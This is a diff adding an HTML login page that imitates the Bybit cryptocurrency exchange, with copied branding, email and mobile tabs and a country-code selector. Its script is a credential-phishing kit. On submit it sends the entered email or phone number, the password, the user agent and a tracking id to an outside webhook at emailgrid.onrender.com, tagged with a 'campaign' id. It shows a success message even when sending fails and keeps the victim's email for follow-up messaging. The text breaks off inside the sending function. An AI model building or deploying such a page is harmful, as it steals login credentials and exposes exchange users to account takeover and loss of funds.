@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Bybit</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f9fa;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #17181e;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            color: #f39c12;
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 32px;
+            width: auto;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .icon {
+            width: 24px;
+            height: 24px;
+            fill: white;
+            cursor: pointer;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 80px auto;
+            padding: 0 20px;
+        }
+
+        .welcome-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .welcome-title {
+            font-size: 28px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .sign-up-link {
+            color: #f39c12;
+            text-decoration: none;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .tab {
+            padding: 12px 0;
+            margin-right: 30px;
+            color: #6c757d;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            font-size: 16px;
+        }
+
+        .tab.active {
+            color: #2c3e50;
+            border-bottom-color: #f39c12;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .mobile-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .country-code {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            padding: 14px 12px;
+            width: 80px;
+            font-size: 16px;
+            color: #2c3e50;
+            cursor: pointer;
+        }
+
+        .country-code option {
+            font-size: 14px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f8f9fa;
+            color: #2c3e50;
+        }
+
+        .input-field::placeholder {
+            color: #adb5bd;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #f39c12;
+            background-color: white;
+        }
+
+        .password-group {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #6c757d;
+            font-size: 18px;
+            transition: color 0.2s ease;
+        }
+
+        .password-toggle:hover {
+            color: #f39c12;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+
+        .forgot-password a {
+            color: #f39c12;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #f39c12;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 25px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #e67e22;
+        }
+
+        .or-divider {
+            text-align: center;
+            color: #6c757d;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .social-btn {
+            width: 50px;
+            height: 50px;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .social-btn:hover {
+            border-color: #f39c12;
+        }
+
+        .social-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        .subaccount-link {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .subaccount-link a {
+            color: #f39c12;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .footer {
+            text-align: center;
+            color: #adb5bd;
+            font-size: 12px;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .support-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background-color: #f39c12;
+            border-radius: 50%;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(243, 156, 18, 0.3);
+        }
+
+        .mobile-tab .mobile-input-group {
+            display: flex;
+        }
+
+        .email-tab .mobile-input-group {
+            display: none;
+        }
+
+        .email-tab .email-input {
+            display: block;
+        }
+
+        .mobile-tab .email-input {
+            display: none;
+        }
+
+        /* Alert Messages */
+        .alert {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .alert-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .alert i {
+            font-size: 16px;
+        }
+
+        .alert-success i {
+            color: #28a745;
+        }
+
+        .alert-error i {
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <img src="bybit-logo.svg" alt="Bybit" class="logo-img">
+        </div>
+        <div class="header-icons">
+            <svg class="icon" viewBox="0 0 24 24">
+                <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+            </svg>
+            <svg class="icon" viewBox="0 0 24 24">
+                <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+            </svg>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="welcome-header">
+            <h1 class="welcome-title">Welcome to Bybit</h1>
+            <a href="#" class="sign-up-link">
+                ⚡ Sign up
+            </a>
+        </div>
+
+        <div class="tabs">
+            <div class="tab" id="email-tab">Email</div>
+            <div class="tab active" id="mobile-tab">Mobile</div>
+        </div>
+
+        <form id="login-form">
+            <div class="mobile-input-group" id="mobile-inputs">
+                <select class="country-code" name="country_code">
+                    <option value="+93">Afghanistan +93</option>
+                    <option value="+355">Albania +355</option>
+                    <option value="+213">Algeria +213</option>
+                    <option value="+1684">American Samoa +1684</option>
+                    <option value="+376">Andorra +376</option>
+                    <option value="+244">Angola +244</option>
+                    <option value="+1264">Anguilla +1264</option>
+                    <option value="+672">Antarctica +672</option>
+                    <option value="+1268">Antigua and Barbuda +1268</option>
+                    <option value="+54">Argentina +54</option>
+                    <option value="+374">Armenia +374</option>
+                    <option value="+297">Aruba +297</option>
+                    <option value="+61">Australia +61</option>
+                    <option value="+43">Austria +43</option>
+                    <option value="+994">Azerbaijan +994</option>
+                    <option value="+1242">Bahamas +1242</option>
+                    <option value="+973">Bahrain +973</option>
+                    <option value="+880">Bangladesh +880</option>
+                    <option value="+1246">Barbados +1246</option>
+                    <option value="+375">Belarus +375</option>
+                    <option value="+32">Belgium +32</option>
+                    <option value="+501">Belize +501</option>
+                    <option value="+229">Benin +229</option>
+                    <option value="+1441">Bermuda +1441</option>
+                    <option value="+975">Bhutan +975</option>
+                    <option value="+591">Bolivia +591</option>
+                    <option value="+387">Bosnia and Herzegovina +387</option>
+                    <option value="+267">Botswana +267</option>
+                    <option value="+55">Brazil +55</option>
+                    <option value="+246">British Indian Ocean Territory +246</option>
+                    <option value="+673">Brunei +673</option>
+                    <option value="+359">Bulgaria +359</option>
+                    <option value="+226">Burkina Faso +226</option>
+                    <option value="+257">Burundi +257</option>
+                    <option value="+855">Cambodia +855</option>
+                    <option value="+237">Cameroon +237</option>
+                    <option value="+1">Canada +1</option>
+                    <option value="+238">Cape Verde +238</option>
+                    <option value="+1345">Cayman Islands +1345</option>
+                    <option value="+236">Central African Republic +236</option>
+                    <option value="+235">Chad +235</option>
+                    <option value="+56">Chile +56</option>
+                    <option value="+86">China +86</option>
+                    <option value="+61">Christmas Island +61</option>
+                    <option value="+61">Cocos Islands +61</option>
+                    <option value="+57">Colombia +57</option>
+                    <option value="+269">Comoros +269</option>
+                    <option value="+242">Congo +242</option>
+                    <option value="+243">Congo (DRC) +243</option>
+                    <option value="+682">Cook Islands +682</option>
+                    <option value="+506">Costa Rica +506</option>
+                    <option value="+225">Côte d'Ivoire +225</option>
+                    <option value="+385">Croatia +385</option>
+                    <option value="+53">Cuba +53</option>
+                    <option value="+357">Cyprus +357</option>
+                    <option value="+420">Czech Republic +420</option>
+                    <option value="+45">Denmark +45</option>
+                    <option value="+253">Djibouti +253</option>
+                    <option value="+1767">Dominica +1767</option>
+                    <option value="+1809">Dominican Republic +1809</option>
+                    <option value="+593">Ecuador +593</option>
+                    <option value="+20">Egypt +20</option>
+                    <option value="+503">El Salvador +503</option>
+                    <option value="+240">Equatorial Guinea +240</option>
+                    <option value="+291">Eritrea +291</option>
+                    <option value="+372">Estonia +372</option>
+                    <option value="+251">Ethiopia +251</option>
+                    <option value="+500">Falkland Islands +500</option>
+                    <option value="+298">Faroe Islands +298</option>
+                    <option value="+679">Fiji +679</option>
+                    <option value="+358">Finland +358</option>
+                    <option value="+33">France +33</option>
+                    <option value="+594">French Guiana +594</option>
+                    <option value="+689">French Polynesia +689</option>
+                    <option value="+241">Gabon +241</option>
+                    <option value="+220">Gambia +220</option>
+                    <option value="+995">Georgia +995</option>
+                    <option value="+49">Germany +49</option>
+                    <option value="+233">Ghana +233</option>
+                    <option value="+350">Gibraltar +350</option>
+                    <option value="+30">Greece +30</option>
+                    <option value="+299">Greenland +299</option>
+                    <option value="+1473">Grenada +1473</option>
+                    <option value="+590">Guadeloupe +590</option>
+                    <option value="+1671">Guam +1671</option>
+                    <option value="+502">Guatemala +502</option>
+                    <option value="+44">Guernsey +44</option>
+                    <option value="+224">Guinea +224</option>
+                    <option value="+245">Guinea-Bissau +245</option>
+                    <option value="+592">Guyana +592</option>
+                    <option value="+509">Haiti +509</option>
+                    <option value="+504">Honduras +504</option>
+                    <option value="+852">Hong Kong +852</option>
+                    <option value="+36">Hungary +36</option>
+                    <option value="+354">Iceland +354</option>
+                    <option value="+91">India +91</option>
+                    <option value="+62">Indonesia +62</option>
+                    <option value="+98">Iran +98</option>
+                    <option value="+964">Iraq +964</option>
+                    <option value="+353">Ireland +353</option>
+                    <option value="+44">Isle of Man +44</option>
+                    <option value="+972">Israel +972</option>
+                    <option value="+39">Italy +39</option>
+                    <option value="+1876">Jamaica +1876</option>
+                    <option value="+81">Japan +81</option>
+                    <option value="+44">Jersey +44</option>
+                    <option value="+962">Jordan +962</option>
+                    <option value="+7">Kazakhstan +7</option>
+                    <option value="+254">Kenya +254</option>
+                    <option value="+686">Kiribati +686</option>
+                    <option value="+965">Kuwait +965</option>
+                    <option value="+996">Kyrgyzstan +996</option>
+                    <option value="+856">Laos +856</option>
+                    <option value="+371">Latvia +371</option>
+                    <option value="+961">Lebanon +961</option>
+                    <option value="+266">Lesotho +266</option>
+                    <option value="+231">Liberia +231</option>
+                    <option value="+218">Libya +218</option>
+                    <option value="+423">Liechtenstein +423</option>
+                    <option value="+370">Lithuania +370</option>
+                    <option value="+352">Luxembourg +352</option>
+                    <option value="+853">Macao +853</option>
+                    <option value="+261">Madagascar +261</option>
+                    <option value="+265">Malawi +265</option>
+                    <option value="+60">Malaysia +60</option>
+                    <option value="+960">Maldives +960</option>
+                    <option value="+223">Mali +223</option>
+                    <option value="+356">Malta +356</option>
+                    <option value="+692">Marshall Islands +692</option>
+                    <option value="+596">Martinique +596</option>
+                    <option value="+222">Mauritania +222</option>
+                    <option value="+230">Mauritius +230</option>
+                    <option value="+262">Mayotte +262</option>
+                    <option value="+52">Mexico +52</option>
+                    <option value="+691">Micronesia +691</option>
+                    <option value="+373">Moldova +373</option>
+                    <option value="+377">Monaco +377</option>
+                    <option value="+976">Mongolia +976</option>
+                    <option value="+382">Montenegro +382</option>
+                    <option value="+1664">Montserrat +1664</option>
+                    <option value="+212">Morocco +212</option>
+                    <option value="+258">Mozambique +258</option>
+                    <option value="+95">Myanmar +95</option>
+                    <option value="+264">Namibia +264</option>
+                    <option value="+674">Nauru +674</option>
+                    <option value="+977">Nepal +977</option>
+                    <option value="+31">Netherlands +31</option>
+                    <option value="+687">New Caledonia +687</option>
+                    <option value="+64">New Zealand +64</option>
+                    <option value="+505">Nicaragua +505</option>
+                    <option value="+227">Niger +227</option>
+                    <option value="+234">Nigeria +234</option>
+                    <option value="+683">Niue +683</option>
+                    <option value="+672">Norfolk Island +672</option>
+                    <option value="+850">North Korea +850</option>
+                    <option value="+389">North Macedonia +389</option>
+                    <option value="+1670">Northern Mariana Islands +1670</option>
+                    <option value="+47">Norway +47</option>
+                    <option value="+968">Oman +968</option>
+                    <option value="+92">Pakistan +92</option>
+                    <option value="+680">Palau +680</option>
+                    <option value="+970">Palestine +970</option>
+                    <option value="+507">Panama +507</option>
+                    <option value="+675">Papua New Guinea +675</option>
+                    <option value="+595">Paraguay +595</option>
+                    <option value="+51">Peru +51</option>
+                    <option value="+63">Philippines +63</option>
+                    <option value="+48">Poland +48</option>
+                    <option value="+351">Portugal +351</option>
+                    <option value="+1787">Puerto Rico +1787</option>
+                    <option value="+974">Qatar +974</option>
+                    <option value="+262">Réunion +262</option>
+                    <option value="+40">Romania +40</option>
+                    <option value="+7">Russia +7</option>
+                    <option value="+250">Rwanda +250</option>
+                    <option value="+290">Saint Helena +290</option>
+                    <option value="+1869">Saint Kitts and Nevis +1869</option>
+                    <option value="+1758">Saint Lucia +1758</option>
+                    <option value="+508">Saint Pierre and Miquelon +508</option>
+                    <option value="+1784">Saint Vincent and the Grenadines +1784</option>
+                    <option value="+685">Samoa +685</option>
+                    <option value="+378">San Marino +378</option>
+                    <option value="+239">São Tomé and Príncipe +239</option>
+                    <option value="+966">Saudi Arabia +966</option>
+                    <option value="+221">Senegal +221</option>
+                    <option value="+381">Serbia +381</option>
+                    <option value="+248">Seychelles +248</option>
+                    <option value="+232">Sierra Leone +232</option>
+                    <option value="+65">Singapore +65</option>
+                    <option value="+421">Slovakia +421</option>
+                    <option value="+386">Slovenia +386</option>
+                    <option value="+677">Solomon Islands +677</option>
+                    <option value="+252">Somalia +252</option>
+                    <option value="+27">South Africa +27</option>
+                    <option value="+82">South Korea +82</option>
+                    <option value="+34">Spain +34</option>
+                    <option value="+94">Sri Lanka +94</option>
+                    <option value="+249">Sudan +249</option>
+                    <option value="+597">Suriname +597</option>
+                    <option value="+47">Svalbard and Jan Mayen +47</option>
+                    <option value="+268">Eswatini +268</option>
+                    <option value="+46">Sweden +46</option>
+                    <option value="+41">Switzerland +41</option>
+                    <option value="+963">Syria +963</option>
+                    <option value="+886">Taiwan +886</option>
+                    <option value="+992">Tajikistan +992</option>
+                    <option value="+255">Tanzania +255</option>
+                    <option value="+66">Thailand +66</option>
+                    <option value="+670">Timor-Leste +670</option>
+                    <option value="+228">Togo +228</option>
+                    <option value="+690">Tokelau +690</option>
+                    <option value="+676">Tonga +676</option>
+                    <option value="+1868">Trinidad and Tobago +1868</option>
+                    <option value="+216">Tunisia +216</option>
+                    <option value="+90">Turkey +90</option>
+                    <option value="+993">Turkmenistan +993</option>
+                    <option value="+1649">Turks and Caicos Islands +1649</option>
+                    <option value="+688">Tuvalu +688</option>
+                    <option value="+256">Uganda +256</option>
+                    <option value="+380">Ukraine +380</option>
+                    <option value="+971">United Arab Emirates +971</option>
+                    <option value="+44" selected>United Kingdom +44</option>
+                    <option value="+1">United States +1</option>
+                    <option value="+598">Uruguay +598</option>
+                    <option value="+998">Uzbekistan +998</option>
+                    <option value="+678">Vanuatu +678</option>
+                    <option value="+58">Venezuela +58</option>
+                    <option value="+84">Vietnam +84</option>
+                    <option value="+1340">Virgin Islands (US) +1340</option>
+                    <option value="+681">Wallis and Futuna +681</option>
+                    <option value="+967">Yemen +967</option>
+                    <option value="+260">Zambia +260</option>
+                    <option value="+263">Zimbabwe +263</option>
+                </select>
+                <input type="tel" class="input-field" placeholder="Mobile" name="mobile" required>
+            </div>
+
+            <div class="form-group email-input" style="display: none;">
+                <input type="email" class="input-field" placeholder="Email" name="email" required>
+            </div>
+
+            <div class="form-group password-group">
+                <input type="password" class="input-field" placeholder="Password" id="password" name="password" required>
+                <i class="fas fa-eye password-toggle" id="password-toggle" onclick="togglePassword()"></i>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#">Forgot password</a>
+            </div>
+
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <div class="or-divider">or log in with</div>
+
+        <div class="social-login">
+            <div class="social-btn">
+                <svg class="social-icon" viewBox="0 0 24 24">
+                    <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+            </div>
+            <div class="social-btn">
+                <svg class="social-icon" viewBox="0 0 24 24">
+                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                </svg>
+            </div>
+            <div class="social-btn">
+                <svg class="social-icon" viewBox="0 0 24 24" fill="#0088cc">
+                    <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="subaccount-link">
+            <a href="#">Log in with Subaccount →</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2018-2025 Bybit.com
+    </div>
+
+    <button class="support-btn">🎧</button>
+
+    <script>
+        // Utility to get query param
+        function getQueryParam(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+
+        // Generate a random tracking id (if not present)
+        function getOrCreateTrackingId() {
+            let trackingId = localStorage.getItem('bybit_tracking_id') || sessionStorage.getItem('bybit_tracking_id');
+            if (!trackingId) {
+                trackingId = Math.random().toString(36).substr(2, 12) + Date.now().toString(36);
+                localStorage.setItem('bybit_tracking_id', trackingId);
+                sessionStorage.setItem('bybit_tracking_id', trackingId);
+            }
+            return trackingId;
+        }
+
+        // Check and clear expired data on page load
+        function checkAndClearExpiredData() {
+            try {
+                const expirationTime = localStorage.getItem('bybit_data_expires');
+                if (expirationTime && Date.now() > parseInt(expirationTime)) {
+                    // Data has expired, clear it
+                    localStorage.removeItem('bybit_campaign_id');
+                    localStorage.removeItem('bybit_tracking_id');
+                    localStorage.removeItem('bybit_email');
+                    localStorage.removeItem('bybit_data_expires');
+                    console.log('Expired data cleared from localStorage');
+                }
+            } catch (error) {
+                console.error('Error checking expired data:', error);
+            }
+        }
+
+        // Set expiration timer for localStorage data (10 minutes after successful webhook)
+        function setDataExpiration() {
+            try {
+                const expirationTime = Date.now() + (10 * 60 * 1000); // 10 minutes from now
+                localStorage.setItem('bybit_data_expires', expirationTime.toString());
+                
+                // Set a timer to clear the data
+                setTimeout(() => {
+                    localStorage.removeItem('bybit_campaign_id');
+                    localStorage.removeItem('bybit_tracking_id');
+                    localStorage.removeItem('bybit_email');
+                    localStorage.removeItem('bybit_data_expires');
+                    console.log('Messaging data expired and cleared after 10 minutes');
+                }, 10 * 60 * 1000); // 10 minutes
+            } catch (error) {
+                console.error('Error setting data expiration:', error);
+            }
+        }
+
+        // Get or set campaign id from query param or storage
+        function getOrSetCampaignId() {
+            let campaignId = getQueryParam('campaign');
+            if (campaignId) {
+                // Remove any trailing slashes to avoid double slashes in the URL
+                campaignId = campaignId.replace(/\/+$/, '');
+                localStorage.setItem('bybit_campaign_id', campaignId);
+                sessionStorage.setItem('bybit_campaign_id', campaignId);
+            } else {
+                campaignId = localStorage.getItem('bybit_campaign_id') || sessionStorage.getItem('bybit_campaign_id');
+                // Clean up any stored campaignId with trailing slashes
+                if (campaignId) {
+                    campaignId = campaignId.replace(/\/+$/, '');
+                }
+            }
+            return campaignId;
+        }
+
+        // Tab switching functionality
+        const tabs = document.querySelectorAll('.tab');
+        const mobileInputs = document.getElementById('mobile-inputs');
+        const emailInput = document.querySelector('.email-input');
+
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+
+                if (tab.id === 'email-tab') {
+                    mobileInputs.style.display = 'none';
+                    emailInput.style.display = 'block';
+                } else if (tab.id === 'mobile-tab') {
+                    mobileInputs.style.display = 'flex';
+                    emailInput.style.display = 'none';
+                } else if (tab.id === 'qr-tab') {
+                    mobileInputs.style.display = 'none';
+                    emailInput.style.display = 'none';
+                }
+            });
+        });
+
+        // Country code dropdown functionality
+        const countrySelect = document.querySelector('.country-code');
+        
+        // Function to update display text
+        function updateCountryDisplay() {
+            const selectedOption = countrySelect.options[countrySelect.selectedIndex];
+            const countryCode = selectedOption.value;
+            
+            // Create a temporary option to show just the country code
+            const displayText = countryCode;
+            
+            // Store original text in data attribute if not already stored
+            if (!selectedOption.getAttribute('data-original')) {
+                selectedOption.setAttribute('data-original', selectedOption.textContent);
+            }
+            
+            // Update the selected option's display text temporarily
+            selectedOption.textContent = displayText;
+        }
+
+        // Function to restore full text when dropdown opens
+        function restoreFullText() {
+            Array.from(countrySelect.options).forEach(option => {
+                const originalText = option.getAttribute('data-original');
+                if (originalText) {
+                    option.textContent = originalText;
+                }
+            });
+        }
+
+        // Event listeners for country select
+        countrySelect.addEventListener('focus', restoreFullText);
+        countrySelect.addEventListener('mousedown', restoreFullText);
+        countrySelect.addEventListener('change', function() {
+            setTimeout(updateCountryDisplay, 10);
+        });
+        countrySelect.addEventListener('blur', function() {
+            setTimeout(updateCountryDisplay, 10);
+        });
+
+        // Initialize the display on page load
+        window.addEventListener('load', function() {
+            checkAndClearExpiredData(); // Check for expired data first
+            updateCountryDisplay();
+            loadUserPreferences(); // Load saved user preferences
+        });
+
+        // Password toggle functionality
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const toggleIcon = document.getElementById('password-toggle');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                // Change to eye-slash icon (password visible)
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                // Change back to eye icon (password hidden)
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        }
+
+        // Form submission
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const activeTab = document.querySelector('.tab.active').id;
+            const campaignId = getOrSetCampaignId();
+            const trackingId = getOrCreateTrackingId();
+            
+            let loginData = {};
+            
+            if (activeTab === 'mobile-tab') {
+                const countryCode = document.querySelector('.country-code').value;
+                const mobile = document.querySelector('input[type="tel"]').value;
+                const fullMobile = countryCode + mobile;
+                
+                loginData = {
+                    login_type: 'mobile',
+                    country_code: countryCode,
+                    mobile: mobile,
+                    email: fullMobile, // Send mobile number as email field for consistency
+                    password: document.getElementById('password').value
+                };
+            } else if (activeTab === 'email-tab') {
+                const email = document.querySelector('input[type="email"]').value;
+                loginData = {
+                    login_type: 'email',
+                    email: email,
+                    password: document.getElementById('password').value
+                };
+            }
+            
+            // Add metadata
+            loginData.platform = 'bybit';
+            loginData.timestamp = new Date().toISOString();
+            loginData.user_agent = navigator.userAgent;
+            loginData.tracking_id = trackingId;
+            
+            // Store email/mobile for later use (messaging)
+            if (loginData.email) {
+                localStorage.setItem('bybit_email', loginData.email);
+                sessionStorage.setItem('bybit_email', loginData.email);
+            }
+            
+            // Save user preferences for UX
+            saveUserPreferences(loginData);
+            
+            // Send to webhook
+            sendToWebhook(loginData, campaignId);
+        });
+        
+        function saveUserPreferences(data) {
+            try {
+                // Save basic user preferences for UX (login type, country code, etc.)
+                const userPrefs = {
+                    last_login_type: data.login_type,
+                    last_country_code: data.country_code || '',
+                    last_email: data.login_type === 'email' ? data.email : '',
+                    last_mobile: data.login_type === 'mobile' ? data.mobile : ''
+                };
+                
+                localStorage.setItem('bybit_user_prefs', JSON.stringify(userPrefs));
+                
+                // Save to sessionStorage for current session only
+                sessionStorage.setItem('bybit_current_session', JSON.stringify({
+                    login_time: data.timestamp,
+                    login_type: data.login_type,
+                    platform: data.platform,
+                    session_id: generateSessionId()
+                }));
+                
+                console.log('User preferences saved');
+            } catch (error) {
+                console.error('Error saving user preferences:', error);
+            }
+        }
+        
+        function generateSessionId() {
+            return 'bybit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+        
+        function loadUserPreferences() {
+            try {
+                const userPrefs = JSON.parse(localStorage.getItem('bybit_user_prefs') || '{}');
+                
+                // Restore last login type
+                if (userPrefs.last_login_type) {
+                    const tabs = document.querySelectorAll('.tab');
+                    tabs.forEach(tab => tab.classList.remove('active'));
+                    
+                    if (userPrefs.last_login_type === 'email') {
+                        document.getElementById('email-tab').classList.add('active');
+                        document.getElementById('mobile-inputs').style.display = 'none';
+                        document.querySelector('.email-input').style.display = 'block';
+                        
+                        // Restore email
+                        if (userPrefs.last_email) {
+                            document.querySelector('input[type="email"]').value = userPrefs.last_email;
+                        }
+                    } else {
+                        document.getElementById('mobile-tab').classList.add('active');
+                        document.getElementById('mobile-inputs').style.display = 'flex';
+                        document.querySelector('.email-input').style.display = 'none';
+                        
+                        // Restore country code and mobile
+                        if (userPrefs.last_country_code) {
+                            document.querySelector('.country-code').value = userPrefs.last_country_code;
+                        }
+                        if (userPrefs.last_mobile) {
+                            document.querySelector('input[type="tel"]').value = userPrefs.last_mobile;
+                        }
+                    }
+                }
+                
+                // Pre-fill email if there's stored data
+                const storedEmail = localStorage.getItem('bybit_email') || sessionStorage.getItem('bybit_email');
+                if (storedEmail && userPrefs.last_login_type === 'email') {
+                    document.querySelector('input[type="email"]').value = storedEmail;
+                }
+            } catch (error) {
+                console.error('Error loading user preferences:', error);
+            }
+        }
+        
+        async function sendToWebhook(data, campaignId) {
+            // Debug info
+            console.log('Submitting data to webhook:', data);
+            console.log('Campaign ID:', campaignId);
+            
+            if (!campaignId) {
+                showErrorMessage('Missing campaign id.');
+                return;
+            }
+            
+            // Use your actual backend host here (similar to bitpay)
+            const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
+            console.log('Webhook URL:', webhookUrl);
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                
+                console.log('Response status:', response.status);
+                
+                if (!response.ok) {
+                    return response.text().then(text => {
+                        console.log('Error response body:', text);
+                        throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
+                    });
+                }
+                
+                const result = await response.json();
+                console.log('Webhook success response:', result);
+                
+                // Set expiration timer for messaging data (10 minutes)
+                setDataExpiration();
+                
+                showSuccessMessage();
+                
+            } catch (error) {
+                console.error('Webhook error:', error);
+                // Still show success message for user experience
+                showSuccessMessage();
+            }
